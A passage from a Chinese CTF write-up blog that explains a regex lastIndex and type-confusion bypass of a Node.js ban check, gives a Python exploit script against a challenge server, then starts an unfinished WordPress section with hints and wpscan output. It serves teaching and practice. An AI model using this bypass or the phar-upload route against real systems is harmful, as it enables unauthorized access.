class="hljs-subst">$&#123;port&#125;</span>`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>一点一点分析：首先定义<code>users</code>对象并设置<code>banned_users</code>数组，然后把<code>admin</code>放里面去。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> users = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,<br>    <span class="hljs-string">&quot;guest&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,<br>    <span class="hljs-string">&#x27;hacker&#x27;</span>:<span class="hljs-string">&#x27;hacker&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">let</span> banned_users = [<span class="hljs-string">&#x27;hacker&#x27;</span>]<br><br><span class="hljs-comment">// 你不准getflag</span><br>banned_users.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;admin&quot;</span>) <br></code></pre></td></tr></table></figure><p>只有<code>admin</code>用户才能拿<code>flag</code>，但刚刚<code>admin</code>已经被丢到<code>banned_users</code>里面了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/flag&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span> <span class="hljs-comment">//从请求体中获取用户名</span><br>    <span class="hljs-keyword">if</span> (username !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">let</span> flag = child_process.<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat flag&quot;</span>).<span class="hljs-title function_">toString</span>()<br>    res.<span class="hljs-title function_">end</span>(flag)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)<br>    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;finish&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>) &#125;, <span class="hljs-number">1</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span><br>&#125;)<br></code></pre></td></tr></table></figure><p><code>waf</code>中正则表达式的设置：简单说就是遍历<code>banned_users</code>这个数组，然后拼成类似<code>^admin$|^hacker$</code>这种字符串放到正则表达式里。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> banned_users_regex = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br>    &#125;<br>    regex_string = regex_string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, regex_string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>)<span class="hljs-comment">//这里是去掉最后一个|</span><br>    banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<span class="hljs-comment">//将regex_string转换为正则表达式对象</span><br>&#125;<br></code></pre></td></tr></table></figure><p>看了下全局标志<code>g</code>：</p><p><img src="/img/nctfwaiatwhat2.png" alt="nctfwaiatwhat2"></p><p>接下来是两个<code>waf</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span><br>    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用正则<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test1) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span><br>    <span class="hljs-keyword">let</span> test2 = (username <span class="hljs-keyword">in</span> banned_users)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用in关键字匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test2&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test2)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>这里先看第二个<code>waf</code>，注意这里：<code>username in banned_users</code></p><blockquote><p>如果指定的属性在指定的对象或其原型链中，则 <strong><code>in</code></strong> <strong>运算符</strong>返回 <code>true</code></p></blockquote><p>这东西对于数组其实检查的是下标，看几个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> car = &#123; <span class="hljs-attr">make</span>: <span class="hljs-string">&#x27;Honda&#x27;</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">&#x27;Accord&#x27;</span>, <span class="hljs-attr">year</span>: <span class="hljs-number">1998</span> &#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;make&#x27;</span> <span class="hljs-keyword">in</span> car);<br><br><span class="hljs-comment">//true</span><br><span class="hljs-keyword">const</span> car = &#123; <span class="hljs-attr">make</span>: <span class="hljs-string">&#x27;Honda&#x27;</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">&#x27;Accord&#x27;</span>, <span class="hljs-attr">year</span>: <span class="hljs-number">1998</span> &#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Honda&#x27;</span> <span class="hljs-keyword">in</span> car);<br><br><span class="hljs-comment">//false</span><br><br>&gt; <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span class="hljs-literal">false</span><br><br>&gt; <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><blockquote><p>由于 banned_users 为 Array 类型，不存在 admin 属性，因此 test2 实际上判断的是banned_users中是否存在数组索引为username的值（由于对象的属性名称会被隐式转换为字符串，”0”和0都可以作为数组索引)</p></blockquote><p>所以第二个<code>waf</code>没啥用，再看第一个：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span><br>    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用正则<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test1) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<span class="hljs-comment">//将regex_string转换为正则表达式对象</span><br></code></pre></td></tr></table></figure><p>正则判断部分使用了<code>banned_users_regex.test()</code>函数，并且<code>new RegExp(regex_string, &quot;g&quot;)</code> 定义了 g 的全局标志：</p><blockquote><p><strong><code>test()</code></strong> 方法执行一个检索，用来查看正则表达式与指定的字符串是否匹配。返回 <code>true</code> 或 <code>false</code>。</p><p>如果正则表达式设置了全局标志，<code>test()</code> 的执行会改变正则表达式 <code>lastIndex</code>属性。连续的执行<code>test()</code>方法，后续的执行将会从 lastIndex 处开始匹配字符串</p></blockquote><p>比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&gt; <span class="hljs-keyword">let</span> r = <span class="hljs-regexp">/^admin$/g</span><br><br>&gt; r.<span class="hljs-property">lastIndex</span><br><span class="hljs-number">0</span><br><br>&gt; r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br><span class="hljs-literal">true</span><br><br>&gt; r.<span class="hljs-property">lastIndex</span><br><span class="hljs-number">5</span><br><br>&gt;r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br><span class="hljs-literal">false</span><br><br>&gt; r.<span class="hljs-property">lastIndex</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>所以可以利用这个特性让正则表达式判断两次<code>admin</code>去绕过检测。</p><p>但注意这里，每次请求的时候都会创建一个新的<code>banned_users_regex</code>来更新封禁用户的正则信息，恢复<code>lastIndex</code>的位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 每次请求前，更新封禁用户正则信息</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_">build_banned_users_regex</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br></code></pre></td></tr></table></figure><p>但这个<code>try catch</code>告诉我们：如果传入的数据导致报错，就可以跳过正则表达式的更新：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;<br>    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);<br>&#125;<br><span class="hljs-comment">//这函数的作用就是将需要转义的字符串替换为斜杠+其本身</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br></code></pre></td></tr></table></figure><p>注意，<code>replace</code>是针对字符串对象的一个方法，所以我们可以通过传入<code>string</code>参数为非字符串类型来抛出异常，从而绕过<code>regex</code>更新。</p><p><code>/ban_user</code>这个路由没对用户输入进行任何过滤、转义等。理论上我们可以构造任意输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span><br>    <span class="hljs-keyword">if</span>(!ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_username不能为空&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(username === ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;不能封禁自己&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;<br>        <span class="hljs-keyword">if</span> (name === ban_username) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户已经被封禁&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>    &#125;<br>    banned_users.<span class="hljs-title function_">push</span>(ban_username)<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;封禁成功！&quot;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>现在解题思路就清晰了：</p><ul><li>访问 &#x2F;api&#x2F;ban_user 路由，构造传入参数 ban_username 为 对象、数组 等其他数据类型 </li><li>访问 &#x2F;api&#x2F;flag ，正则匹配成功，使得 regex 的 lastIndex 移至 “admin”.length 以后 </li><li>访问 &#x2F;api&#x2F;flag，正则匹配失败，成功绕过正则 waf，正则 waf 返回 false，获得 flag</li></ul><p><code>exp</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>remote_addr=<span class="hljs-string">&quot;http://117.50.175.234:9001&quot;</span><br><br>rs = requests.Session()<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure><h3 id="ez-wordpress-未做完"><a href="#ez-wordpress-未做完" class="headerlink" title="ez_wordpress[未做完]"></a>ez_wordpress[未做完]</h3><blockquote><p>Hint 1: 可以思考下如何对 WordPress 进行信息收集 </p><p> Hint 2: 注意版本 (6.4.1) 注意一些第三方的东西 </p><p> Hint 3:  结合信息收集和网上已有的东西就可以自己本地搭建一个类似的环境进行测试 涉及的代码审计部分其实很少 </p><p> Hint 4: <a href="https://wwnt.lanzout.com/iwUdK1ir03te">https://wwnt.lanzout.com/iwUdK1ir03te</a> </p><p> Hint 5: upload phar + file read (ssrf) &#x3D;&gt; rce </p><p> Hint 6: 请不要使用 burp 的 Paste from file 功能 (存在 bug)  建议手动构造 upload.html 然后浏览器选择文件抓取上传包  或者写 python 脚本上传  或者使用 yakit</p></blockquote><p><code>wpscan</code>直接扫</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">viper3㉿kali)-[~]<br>└─$ wpscan --url http://124.71.184.68:8012/ --api-token xxxxxxxxxxxxx<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<span class="hljs-string"></span><br><span class="hljs-string">          \ \  /\  / /</span>|<span class="hljs-string"> </span>|<span class="hljs-string">__) </span>|<span class="hljs-string"> (___   ___  __ _ _ __ ®</span><br><span class="hljs-string">           \ \/  \/ / </span>|<span class="hljs-string">  ___/ \___ \ / __</span>|<span class="hljs-string">/ _` </span>|<span class="hljs-string"> &#x27;_ \</span><br><span class="hljs-string">            \  /\  /  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">     ____) </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<br>             \/  \/   |<span class="hljs-string">_</span>|<span class="hljs-string">    </span>|<span class="hljs-string">_____/ \___</span>|<span class="hljs-string">\__,_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.22<br>       Sponsored by Automattic - https://automattic.com/<br>       <span class="hljs-meta">@_WPScan_,</span> <span class="hljs-meta">@ethicalhack3r,</span> <span class="hljs-meta">@erwan_lr,</span> <span class="hljs-meta">@firefart</span><br>_______________________________________________________________<br><br>[+] URL: http://124.71.184.68:8012/ [124.71.184.68]<br>[+] Started: Sat Dec 30 17:37:30 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> |<span class="hljs-string"> Interesting Entries:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - Server: Apache/2.4.54 (Debian)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - X-Powered-By: PHP/7.4.33</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://124.71.184.68:8012/xmlrpc.php</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://124.71.184.68:8012/readme.html</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://124.71.184.68:8012/wp-cron.php</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 60%</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 6.4.1 identified (Insecure, released on 2023-11-09).</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Emoji Settings (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.1&#x27;</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Meta Generator (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/, Match: &#x27;WordPress 6.4.1&#x27;</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] 1 vulnerability identified:</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: WP 6.4-6.4.1 - POP Chain</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 6.4.2</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentytwentyfour</span><br><span class="hljs-string"> 